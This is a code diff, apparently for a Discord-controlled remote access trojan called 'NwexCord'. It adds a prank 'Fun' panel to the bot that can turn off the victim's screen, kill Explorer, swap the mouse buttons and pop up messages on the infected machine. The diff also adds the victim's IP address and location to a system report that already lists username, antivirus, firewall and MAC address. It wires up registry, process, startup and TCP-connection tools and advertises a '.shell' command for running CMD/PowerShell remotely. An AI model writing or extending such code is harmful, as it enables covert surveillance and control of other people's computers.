+    async def on_submit(self, interaction: discord.Interaction):
+        t, tx = str(self.title_input), str(self.text_input)
+        FunManager.show_balloon_tip(t, tx, self.icon)
+        e = discord.Embed(title="🔔 BalloonTooltip", description=f"**Icon:** {self.icon}\n**Title:** `{t}`\n**Text:** `{tx}`", color=discord.Color.green())
+        e.set_footer(text="NwexCord • Fun")
+        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())
+
+class MsgBoxIconSelect(discord.ui.Select):
+    def __init__(self, default="Information"):
+        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["Information", "Error", "Warning", "Question"]]
+        super().__init__(placeholder="MessageBoxIcon", options=options, row=1)
+    async def callback(self, interaction: discord.Interaction):
+        self.view.selected_icon = self.values[0]
+        await interaction.response.defer()
+
+class MsgBoxButtonSelect(discord.ui.Select):
+    def __init__(self, default="OK"):
+        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["OK", "OKCancel", "YesNo", "YesNoCancel", "RetryCancel", "AbortRetryIgnore"]]
+        super().__init__(placeholder="MessageBoxButton", options=options, row=2)
+    async def callback(self, interaction: discord.Interaction):
+        self.view.selected_button = self.values[0]
+        await interaction.response.defer()
+
+class MessageBoxTabView(discord.ui.View):
+    def __init__(self, icon="Information", button="OK"):
+        super().__init__(timeout=300)
+        self.selected_icon = icon
+        self.selected_button = button
+        self.add_item(MsgBoxIconSelect(icon))
+        self.add_item(MsgBoxButtonSelect(button))
+    @discord.ui.button(label="📦 MessageBox", style=discord.ButtonStyle.primary, disabled=True, row=0)
+    async def tab_msgbox(self, interaction: discord.Interaction, button: discord.ui.Button): pass
+    @discord.ui.button(label="🔔 BalloonTooltip", style=discord.ButtonStyle.secondary, row=0)
+    async def tab_balloon(self, interaction: discord.Interaction, button: discord.ui.Button):
+        e = discord.Embed(title="🔔 BalloonTooltip", description="Configure and send a BalloonTooltip notification.", color=discord.Color.from_rgb(255, 85, 85))
+        e.set_footer(text="NwexCord • Fun")
+        await interaction.response.edit_message(content=None, embed=e, view=BalloonTipTabView())
+    @discord.ui.button(label="📤 Send", style=discord.ButtonStyle.success, row=3)
+    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(MessageBoxSendModal(self.selected_icon, self.selected_button))
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=3)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+class BalloonIconSelect(discord.ui.Select):
+    def __init__(self, default="Info"):
+        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["Info", "Warning", "Error", "None"]]
+        super().__init__(placeholder="Icon", options=options, row=1)
+    async def callback(self, interaction: discord.Interaction):
+        self.view.selected_icon = self.values[0]
+        await interaction.response.defer()
+
+class BalloonTipTabView(discord.ui.View):
+    def __init__(self, icon="Info"):
+        super().__init__(timeout=300)
+        self.selected_icon = icon
+        self.add_item(BalloonIconSelect(icon))
+    @discord.ui.button(label="📦 MessageBox", style=discord.ButtonStyle.secondary, row=0)
+    async def tab_msgbox(self, interaction: discord.Interaction, button: discord.ui.Button):
+        e = discord.Embed(title="📦 MessageBox", description="Configure and send a MessageBox to the client.", color=discord.Color.from_rgb(255, 85, 85))
+        e.set_footer(text="NwexCord • Fun")
+        await interaction.response.edit_message(content=None, embed=e, view=MessageBoxTabView())
+    @discord.ui.button(label="🔔 BalloonTooltip", style=discord.ButtonStyle.primary, disabled=True, row=0)
+    async def tab_balloon(self, interaction: discord.Interaction, button: discord.ui.Button): pass
+    @discord.ui.button(label="📤 Send", style=discord.ButtonStyle.success, row=2)
+    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(BalloonTipSendModal(self.selected_icon))
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+# --- Sub-Panel Views ---
+
+def _fun_sub_embed(title, status_msg=None, success=None):
+    e = discord.Embed(title=title, color=discord.Color.from_rgb(255, 85, 85))
+    if status_msg:
+        e.description = f"{'✅' if success else '❌'} {status_msg}"
+    e.set_footer(text="NwexCord • Fun")
+    return e
+
+class ClockPanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    @discord.ui.button(label="Show", emoji="👁️", style=discord.ButtonStyle.success)
+    async def show_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.clock_show()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🕐 Clock", m, s), view=ClockPanelView())
+    @discord.ui.button(label="Hide", emoji="🙈", style=discord.ButtonStyle.danger)
+    async def hide_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.clock_hide()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🕐 Clock", m, s), view=ClockPanelView())
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+class ScreenPanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    @discord.ui.button(label="On", emoji="💡", style=discord.ButtonStyle.success)
+    async def on_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.screen_on()
+        await interaction.response.edit_message(embed=_fun_sub_embed("📺 Screen", m, s), view=ScreenPanelView())
+    @discord.ui.button(label="Off", emoji="🌑", style=discord.ButtonStyle.danger)
+    async def off_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.screen_off()
+        await interaction.response.edit_message(embed=_fun_sub_embed("📺 Screen", m, s), view=ScreenPanelView())
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+class ExplorerPanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    @discord.ui.button(label="Kill", emoji="💀", style=discord.ButtonStyle.danger)
+    async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.explorer_kill()
+        await interaction.response.edit_message(embed=_fun_sub_embed("📁 Explorer", m, s), view=ExplorerPanelView())
+    @discord.ui.button(label="Start", emoji="🚀", style=discord.ButtonStyle.success)
+    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.explorer_start()
+        await interaction.response.edit_message(embed=_fun_sub_embed("📁 Explorer", m, s), view=ExplorerPanelView())
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+class DesktopPanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    @discord.ui.button(label="Show", emoji="👁️", style=discord.ButtonStyle.success)
+    async def show_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.desktop_icons_show()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🖥️ Desktop Icons", m, s), view=DesktopPanelView())
+    @discord.ui.button(label="Hide", emoji="🙈", style=discord.ButtonStyle.danger)
+    async def hide_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.desktop_icons_hide()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🖥️ Desktop Icons", m, s), view=DesktopPanelView())
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+class MousePanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    @discord.ui.button(label="Normal", emoji="🖱️", style=discord.ButtonStyle.success)
+    async def normal_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.swap_mouse_normal()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🖱️ Mouse", m, s), view=MousePanelView())
+    @discord.ui.button(label="Swap", emoji="🔄", style=discord.ButtonStyle.danger)
+    async def swap_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.swap_mouse_swap()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🖱️ Mouse", m, s), view=MousePanelView())
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+class VolumePanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    @discord.ui.button(label="Vol +25%", emoji="🔊", style=discord.ButtonStyle.success)
+    async def up_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.volume_up()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🔊 Volume", m, s), view=VolumePanelView())
+    @discord.ui.button(label="Vol -25%", emoji="🔉", style=discord.ButtonStyle.secondary)
+    async def down_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.volume_down()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🔉 Volume", m, s), view=VolumePanelView())
+    @discord.ui.button(label="Mute", emoji="🔇", style=discord.ButtonStyle.danger)
+    async def mute_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        s, m = FunManager.volume_mute()
+        await interaction.response.edit_message(embed=_fun_sub_embed("🔇 Volume", m, s), view=VolumePanelView())
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+# --- Fun Result & Main Panel ---
+
+class FunResultView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    @discord.ui.button(label="Back to Fun", emoji="⬅", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+class FunPanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+    # Row 0: Modal actions
+    @discord.ui.button(label="Open URL", emoji="🌐", style=discord.ButtonStyle.primary, row=0)
+    async def open_url_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(OpenURLModal())
+    @discord.ui.button(label="Client Chat", emoji="\U0001f4ac", style=discord.ButtonStyle.primary, row=0)
+    async def client_chat_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=build_chat_embed([]), view=ClientChatView())
+    @discord.ui.button(label="MessageBox", emoji="📦", style=discord.ButtonStyle.primary, row=0)
+    async def messagebox_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        e = discord.Embed(title="📦 MessageBox", description="Configure and send a MessageBox to the client.", color=discord.Color.from_rgb(255, 85, 85))
+        e.set_footer(text="NwexCord • Fun")
+        await interaction.response.edit_message(content=None, embed=e, view=MessageBoxTabView())
+    @discord.ui.button(label="Text Speak", emoji="🗣️", style=discord.ButtonStyle.primary, row=0)
+    async def textspeak_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(TextSpeakModal())
+    # Row 1: Sub-panel features
+    @discord.ui.button(label="Clock", emoji="🕐", style=discord.ButtonStyle.secondary, row=1)
+    async def clock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🕐 Clock"), view=ClockPanelView())
+    @discord.ui.button(label="Screen", emoji="📺", style=discord.ButtonStyle.secondary, row=1)
+    async def screen_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("📺 Screen"), view=ScreenPanelView())
+    @discord.ui.button(label="Explorer", emoji="📁", style=discord.ButtonStyle.secondary, row=1)
+    async def explorer_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("📁 Explorer"), view=ExplorerPanelView())
+    # Row 2: More sub-panel features
+    @discord.ui.button(label="Desktop", emoji="🖥️", style=discord.ButtonStyle.secondary, row=2)
+    async def desktop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🖥️ Desktop Icons"), view=DesktopPanelView())
+    @discord.ui.button(label="Mouse", emoji="🖱️", style=discord.ButtonStyle.secondary, row=2)
+    async def mouse_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🖱️ Mouse"), view=MousePanelView())
+    @discord.ui.button(label="Volume", emoji="🔊", style=discord.ButtonStyle.secondary, row=2)
+    async def volume_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🔊 Volume"), view=VolumePanelView())
+    # Row 3: Back
+    @discord.ui.button(label="⬅ Back to Info", style=discord.ButtonStyle.secondary, row=3)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        info = get_sys_info()
+        left_col = (
+            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
+            f"👤 **UserName** : {info['UserName']}\n"
+            f"🖥️ **PCName** : {info['PCName']}\n"
+            f"🪟 **OS** : {info['OS']}\n"
+            f"📁 **Client** : {info['Client']}\n"
+            f"⚙️ **Process** : {info['Process']}\n"
+            f"📅 **DateTime** : {info['DateTime']}\n"
+            f"🎇 **GPU** : {info['GPU']}\n"
+            f"🧠 **CPU** : {info['CPU']}\n"
+            f"🏷️ **Identifier** : {info['Identifier']}\n"
+            f"📊 **Ram** : {info['Ram']}"
+        )
+        right_col = (
+            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
+            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
+            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
+            f"⚠️ **Firewall** : {info['Firewall']}\n"
+            f"🌐 **MacAddress** : {info['MacAddress']}\n"
+            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
+            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
+            f"💻 **Platform** : {info['Platform']}\n"
+            f"📋 **Ver** : {info['Ver']}\n"
+            f"🔵 **.Net** : {info['.Net']}\n"
+            f"🔋 **Battery** : {info['Battery']}"
+        )
+        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
+        embed.add_field(name="\u200b", value=left_col, inline=True)
+        embed.add_field(name="\u200b", value=right_col, inline=True)
+        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
+        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
+        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())
 
 
 class ToolsPanelView(discord.ui.View):
@@ -658,23 +2532,37 @@ class ToolsPanelView(discord.ui.View):
         session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
         embed = build_registry_embed("", session_id)
         view = RegistryView("", session_id)
-        await interaction.response.send_message(embed=embed, view=view)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Active Windows", emoji="🪟", style=discord.ButtonStyle.secondary, row=0)
     async def activewindows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await run_tool(interaction, "activewindows")
+        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
+        embed, windows = build_activewindows_embed(session_id)
+        view = ActiveWindowsView(session_id)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="TCP Connections", emoji="🌐", style=discord.ButtonStyle.secondary, row=0)
     async def tcp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await run_tool(interaction, "tcp")
+        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
+        embed, conns, pg, tp = build_tcp_embed(session_id)
+        view = TCPConnectionsView(session_id, pg, conns)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Startup Manager", emoji="🚀", style=discord.ButtonStyle.secondary, row=0)
     async def startup_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await run_tool(interaction, "startup")
+        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
+        items = StartupManager.get_all_items()
+        embed, items = build_startup_embed(session_id, items)
+        view = StartupManagerView(session_id, items)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Process Manager", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
     async def process_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await run_tool(interaction, "process")
+        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
+        procs = ProcessManager.get_processes()
+        embed, procs, pg, tp = build_process_embed(session_id, 0, procs)
+        view = ProcessManagerView(session_id, pg, procs)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Service Manager", emoji="🔧", style=discord.ButtonStyle.secondary, row=1)
     async def service_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -686,23 +2574,62 @@ class ToolsPanelView(discord.ui.View):
     
     @discord.ui.button(label="Installed Programs", emoji="💿", style=discord.ButtonStyle.secondary, row=1)
     async def programs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await run_tool(interaction, "programs")
+        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
+        progs = InstalledProgramsManager.get_programs()
+        embed, progs, pg, tp = build_programs_embed(session_id, 0, progs)
+        view = InstalledProgramsView(session_id, pg, progs)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+    
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        """Return to the startup info message."""
+        info = get_sys_info()
+        left_col = (
+            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
+            f"👤 **UserName** : {info['UserName']}\n"
+            f"🖥️ **PCName** : {info['PCName']}\n"
+            f"🪟 **OS** : {info['OS']}\n"
+            f"📁 **Client** : {info['Client']}\n"
+            f"⚙️ **Process** : {info['Process']}\n"
+            f"📅 **DateTime** : {info['DateTime']}\n"
+            f"🎇 **GPU** : {info['GPU']}\n"
+            f"🧠 **CPU** : {info['CPU']}\n"
+            f"🏷️ **Identifier** : {info['Identifier']}\n"
+            f"📊 **Ram** : {info['Ram']}"
+        )
+        right_col = (
+            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
+            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
+            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
+            f"⚠️ **Firewall** : {info['Firewall']}\n"
+            f"🌐 **MacAddress** : {info['MacAddress']}\n"
+            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
+            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
+            f"💻 **Platform** : {info['Platform']}\n"
+            f"📋 **Ver** : {info['Ver']}\n"
+            f"🔵 **.Net** : {info['.Net']}\n"
+            f"🔋 **Battery** : {info['Battery']}"
+        )
+        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
+        embed.add_field(name="\u200b", value=left_col, inline=True)
+        embed.add_field(name="\u200b", value=right_col, inline=True)
+        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
+        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
+        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())
 
 
 class StartupView(discord.ui.View):
-    """View attached to the startup message with a Tools button."""
+    """View attached to the startup message with Tools and Fun buttons."""
     def __init__(self):
         super().__init__(timeout=None)
     
     @discord.ui.button(label="Tools", emoji="🧰", style=discord.ButtonStyle.primary)
     async def tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        tools_embed = discord.Embed(
-            title="🧰 NwexCord Tools",
-            description="Select a tool from the buttons below to execute it on the target machine.",
-            color=discord.Color.blurple()
-        )
-        tools_embed.set_footer(text="NwexCord • Tools Panel")
-        await interaction.response.send_message(embed=tools_embed, view=ToolsPanelView(), ephemeral=False)
+        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
+    
+    @discord.ui.button(label="Fun", emoji="🎉", style=discord.ButtonStyle.danger)
+    async def fun_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
 
 @bot.event
 async def on_ready():
@@ -732,6 +2659,7 @@ async def on_ready():
     info = get_sys_info()
     
     left_col = (
+        f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
         f"👤 **UserName** : {info['UserName']}\n"
         f"🖥️ **PCName** : {info['PCName']}\n"
         f"🪟 **OS** : {info['OS']}\n"
@@ -745,6 +2673,7 @@ async def on_ready():
     )
     
     right_col = (
+        f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
         f"⏱️ **LastReboot** : {info['LastReboot']}\n"
         f"🛡️ **Antivirus** : {info['Antivirus']}\n"
         f"⚠️ **Firewall** : {info['Firewall']}\n"
